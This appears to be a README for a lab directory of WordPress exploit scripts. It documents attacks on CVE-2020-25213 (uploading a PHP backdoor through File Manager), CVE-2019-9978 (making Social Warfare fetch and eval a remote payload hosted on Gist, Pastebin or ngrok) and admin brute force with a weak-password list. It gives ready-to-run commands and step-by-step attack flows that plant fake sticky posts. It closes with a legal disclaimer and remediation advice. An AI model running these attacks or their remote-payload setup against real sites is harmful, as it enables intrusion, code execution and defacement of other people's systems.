# WordPress Exploitation Scripts

This directory contains three exploitation scripts demonstrating **unauthorized content promotion** on vulnerable WordPress installations.

## ğŸ“‹ Exploits Overview

| Exploit | CVE/Type | CVSS | Authentication | Color Code |
|---------|----------|------|----------------|------------|
| File Manager RCE | CVE-2020-25213 | 10.0 | âŒ None | ğŸŸ¢ Green |
| Social Warfare RCE | CVE-2019-9978 | 9.8 | âŒ None | ğŸ”´ Red |
| Weak Credentials | Brute Force | 8.0 | âŒ Bypassed | ğŸŸ¡ Yellow |

---

## ğŸŸ¢ CVE-2020-25213: File Manager RCE

**Vulnerability:** WordPress File Manager Plugin (versions 6.0 - 6.8)  
**Script:** `cve-2020-25213-file-manager-rce.py`

### Description
Exploits unauthenticated arbitrary file upload vulnerability in the File Manager plugin. Uploads a minimal PHP backdoor to create and promote unauthorized content.

### Usage
```bash
python3 cve-2020-25213-file-manager-rce.py http://wordpress.tujuh
```

### Attack Flow
1. âœ… Discovers vulnerable `connector.minimal.php` endpoint
2. âœ… Uploads PHP backdoor (`promote.php`) without authentication
3. âœ… Executes backdoor to create promotional post
4. âœ… Publishes content with fake metrics (999,999 views, 9,999 comments)
5. âœ… Sets content as sticky/featured on homepage

### Content Identifier
Posts created by this exploit will have the title:
> **ğŸŸ¢ [CVE-2020-25213] Unauthorized Content Promotion via File Manager RCE**

---

## ğŸ”´ CVE-2019-9978: Social Warfare RCE

**Vulnerability:** Social Warfare Plugin (versions 3.5.0 - 3.5.2)  
**Script:** `cve-2019-9978-remote.py`  
**Payload:** `cve-2019-9978-remote-payload.txt`

### Description
Exploits debug mode in Social Warfare plugin to fetch and execute remote PHP payload via `eval()`. Demonstrates realistic attack using external payload hosting (GitHub Gist).

### Payload Setup

**Option A: GitHub Gist (Recommended)**
1. Go to https://gist.github.com/
2. Create new secret gist
3. Filename: `payload.txt`
4. Content: Copy from `cve-2019-9978-remote-payload.txt`
5. Create gist and click "Raw"
6. Copy the raw URL

**Option B: Pastebin**
1. Go to https://pastebin.com/
2. Paste content from `cve-2019-9978-remote-payload.txt`
3. Create paste
4. Click "raw" and copy URL

**Option C: Local Server + ngrok**
```bash
# Terminal 1: Start local server
cd wordpress/exploits
python3 -m http.server 8000

# Terminal 2: Create tunnel
ngrok http 8000
# Copy HTTPS URL
```

### Usage
```bash
# Using GitHub Gist
python3 cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://gist.githubusercontent.com/USER/GIST_ID/raw/HASH/payload.txt

# Using Pastebin
python3 cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://pastebin.com/raw/PASTE_ID

# Using ngrok
python3 cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://YOUR-ID.ngrok.io/cve-2019-9978-remote-payload.txt
```

### Attack Flow
1. âœ… Hosts malicious payload on external server (GitHub Gist)
2. âœ… Triggers Social Warfare debug mode
3. âœ… Plugin fetches remote payload via `swp_url` parameter
4. âœ… Payload executed via `eval()` without validation
5. âœ… Creates promotional post via WordPress API
6. âœ… Publishes and promotes content without authentication

### Content Identifier
Posts created by this exploit will have the title:
> **ğŸ”´ [CVE-2019-9978] Unauthorized Content Promotion via Social Warfare RCE**

---

## ğŸŸ¡ Weak Credentials Exploitation

**Vulnerability:** Broken Authentication + No Rate Limiting  
**Script:** `weak-credentials-exploit.py`

### Description
Demonstrates brute force attack on WordPress admin login due to weak passwords and lack of security controls (no rate limiting, no account lockout, no CAPTCHA).

### Usage

**Default Mode (Built-in Password List):**
```bash
python3 weak-credentials-exploit.py http://wordpress.tujuh
```

**Custom Username:**
```bash
python3 weak-credentials-exploit.py http://wordpress.tujuh --username admin
```

**Custom Password List:**
```bash
# Create password list
cat > passwords.txt <<EOF
admin
password
123456
admin123
wordpress
EOF

# Run exploit
python3 weak-credentials-exploit.py http://wordpress.tujuh --passwords passwords.txt
```

### Default Passwords Tested
- admin
- password
- 123456
- admin123
- password123
- letmein
- welcome
- monkey
- qwerty
- 12345678

### Attack Flow
1. âœ… Enumerates admin username (default: "admin")
2. âœ… Attempts automated login with password list
3. âœ… No rate limiting - unlimited attempts allowed
4. âœ… No account lockout despite failed attempts
5. âœ… Successfully authenticates with weak password
6. âœ… Gains full admin access to WordPress
7. âœ… Creates and promotes unauthorized content
8. âœ… Sets content as sticky/featured

### Content Identifier
Posts created by this exploit will have the title:
> **ğŸŸ¡ [WEAK-CREDENTIALS] Unauthorized Content Promotion via Brute Force**

---

## ğŸ¯ Testing Workflow

### Prerequisites
1. WordPress installed at `http://wordpress.tujuh` (via Nginx Proxy Manager)
2. Vulnerable plugins installed:
   - WP File Manager (v6.4 or earlier)
   - Social Warfare (v3.5.2 or earlier)
3. Weak admin credentials configured: `admin` / `admin`

### Complete Testing Sequence

```bash
# Navigate to exploits directory
cd wordpress/exploits

# Test 1: CVE-2020-25213 (File Manager RCE)
python3 cve-2020-25213-file-manager-rce.py http://wordpress.tujuh

# Test 2: CVE-2019-9978 (Social Warfare RCE)
# First, upload payload to GitHub Gist, then:
python3 cve-2019-9978-remote.py http://wordpress.tujuh \
  --payload-url https://gist.githubusercontent.com/.../payload.txt

# Test 3: Weak Credentials (Brute Force)
python3 weak-credentials-exploit.py http://wordpress.tujuh
```

### Expected Results

Each exploit will:
- âœ… Display step-by-step progress
- âœ… Create a unique promotional post (identifiable by color code in title)
- âœ… Publish and promote content without authentication
- âœ… Add fake popularity metrics
- âœ… Set content as sticky/featured on homepage
- âœ… Display public URL for verification

### Verification

Visit `http://wordpress.tujuh` homepage and observe:
- **3 featured/sticky posts** (one from each exploit)
- Each post clearly labeled with its exploitation method
- Posts display attack chain, business impact, and technical details
- Distinguishable by color scheme:
  - ğŸŸ¢ Green = CVE-2020-25213
  - ğŸ”´ Red = CVE-2019-9978
  - ğŸŸ¡ Yellow = Weak Credentials

---

## ğŸ“ Files in This Directory

| File | Purpose |
|------|---------|
| `cve-2020-25213-file-manager-rce.py` | File Manager exploit (ğŸŸ¢ Green) |
| `cve-2019-9978-remote.py` | Social Warfare exploit script (ğŸ”´ Red) |
| `cve-2019-9978-remote-payload.txt` | Social Warfare payload (to be hosted externally) |
| `weak-credentials-exploit.py` | Brute force exploit (ğŸŸ¡ Yellow) |
| `cve-2020-25213-file-manager-rce.py.old` | Backup of original File Manager exploit |
| `README.md` | This documentation |

---

## âš ï¸ Legal Disclaimer

**These scripts are for EDUCATIONAL and AUTHORIZED TESTING ONLY.**

- âœ… Use ONLY on systems you own or have explicit written permission to test
- âœ… Use ONLY in isolated lab environments
- âŒ NEVER use on production systems
- âŒ NEVER use on systems you don't own
- âŒ NEVER use on public networks

**Unauthorized access to computer systems is illegal in most jurisdictions.**

---

## ğŸ›¡ï¸ Security Recommendations

### For CVE-2020-25213
- Update WP File Manager to version 6.9 or later
- Remove plugin if not needed
- Implement web application firewall (WAF)
- Monitor file uploads and server logs

### For CVE-2019-9978
- Update Social Warfare to version 3.5.3 or later
- Disable debug mode in production
- Monitor outbound connections
- Implement egress filtering

### For Weak Credentials
- Enforce strong password policy (12+ characters, complexity)
- Enable two-factor authentication (2FA)
- Implement rate limiting (e.g., Wordfence, Limit Login Attempts)
- Enable account lockout after failed attempts
- Use CAPTCHA (e.g., reCAPTCHA)
- Monitor and alert on failed login attempts
- Don't use "admin" as username

---

## ğŸ“š Additional Resources

- **WPScan Database:** https://wpscan.com/
- **CVE-2020-25213 Details:** https://nvd.nist.gov/vuln/detail/CVE-2020-25213
- **CVE-2019-9978 Details:** https://nvd.nist.gov/vuln/detail/CVE-2019-9978
- **OWASP Authentication Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **WordPress Security Guide:** https://wordpress.org/support/article/hardening-wordpress/

---

**Version:** 2.0  
**Last Updated:** October 19, 2025  
**Focus:** Unauthorized Content Promotion Demonstrations
